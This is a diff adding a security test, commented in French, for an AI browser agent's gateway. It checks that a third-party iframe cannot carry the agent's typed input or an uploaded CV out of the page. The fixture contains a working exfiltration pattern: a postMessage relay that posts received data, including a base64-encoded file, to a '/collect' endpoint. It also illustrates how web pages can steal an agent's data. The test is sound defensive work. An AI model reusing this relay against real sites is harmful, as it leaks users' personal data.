@@ -338,3 +338,80 @@ test(
     assert.deepEqual(lines(), [], 'aucun envoi refusé n’est parti');
   },
 );
+
+// ---------------------------------------------------------------------------------------------
+// Constat 4 : iframe d'un autre site qui écrit vers sa propre origine
+// ---------------------------------------------------------------------------------------------
+
+// Un autre site FICTIF (localhost) dont la page relaie vers sa propre origine ce qu'on lui passe
+// par postMessage, et poste au chargement un jeton de widget (sans donnée de l'agent).
+async function relay(t) {
+  return site(
+    t,
+    `<script>
+      fetch('/widget/token', { method: 'POST', body: 'jeton-FICTIF' });
+      window.addEventListener('message', (e) => fetch('/collect', { method: 'POST', body: String(e.data) }));
+    </script>`,
+    { host: 'localhost' },
+  );
+}
+
+test(
+  'Constat 4 : une iframe d’un autre site ne fait pas sortir une saisie de l’agent ni son CV sans carte ; son jeton passe, tracé',
+  { skip },
+  async (t) => {
+    const other = await relay(t);
+    const { origin, lines } = await site(
+      t,
+      `<form><input id="nom" name="nom" aria-label="Nom"><input type="file" id="cv" name="cv"></form>
+       <iframe id="f" src="${other.origin}/"></iframe>`,
+    );
+    // Le téléversement lui-même est accordé ; tout le reste est refusé.
+    const { gateway, provider, folder, sends, traced } = await owner(
+      t,
+      [origin, other.origin],
+      (r) => r.capability === 'browser.upload',
+    );
+    await gateway.call('browser.navigate', { url: origin });
+    for (let i = 0; i < 80 && !other.lines().length; i++) await sleep(25);
+    assert.deepEqual(other.lines(), ['POST /widget/token'], 'le jeton du widget est obtenu');
+    const snap = await gateway.call('browser.snapshot', {});
+    assert.ok(traced.includes(other.origin.replace('http://', '')), 'écriture tracée (hôte)');
+    assert.ok(snap);
+    await gateway.call('browser.type', {
+      ref: await refFor(gateway, '#nom'),
+      text: 'Nom-FICTIF-Alpha',
+    });
+    // Le script de l'onglet relaie la saisie de l'agent vers l'iframe : carte (refusée), rien ne part.
+    await provider.page.evaluate(() =>
+      document
+        .getElementById('f')
+        .contentWindow.postMessage(document.getElementById('nom').value, '*'),
+    );
+    for (let i = 0; i < 60 && !sends().length; i++) await sleep(25);
+    assert.deepEqual(
+      sends().map((r) => r.capability),
+      ['browser.send'],
+    );
+    // Le CV joint par l'agent, lu par la page et relayé en base64 : carte, rien ne part.
+    const { writeFileSync } = await import('node:fs');
+    writeFileSync(
+      join(folder, 'cv-FICTIF.pdf'),
+      `%PDF-1.4\n% CV FICTIF\n${'x'.repeat(400)}\n%%EOF\n`,
+    );
+    await gateway.call('browser.upload', {
+      ref: await refFor(gateway, '#cv'),
+      path: 'cv-FICTIF.pdf',
+    });
+    await provider.page.evaluate(async () => {
+      const file = document.getElementById('cv').files[0];
+      const data = btoa(String.fromCharCode(...new Uint8Array(await file.arrayBuffer())));
+      document.getElementById('f').contentWindow.postMessage(data, '*');
+    });
+    for (let i = 0; i < 60 && sends().length < 2; i++) await sleep(25);
+    await sleep(300);
+    assert.equal(sends().length, 2, 'une carte pour le CV relayé');
+    assert.deepEqual(other.lines(), ['POST /widget/token'], 'ni la saisie ni le CV ne sont sortis');
+    assert.deepEqual(lines(), []);
+  },
+);
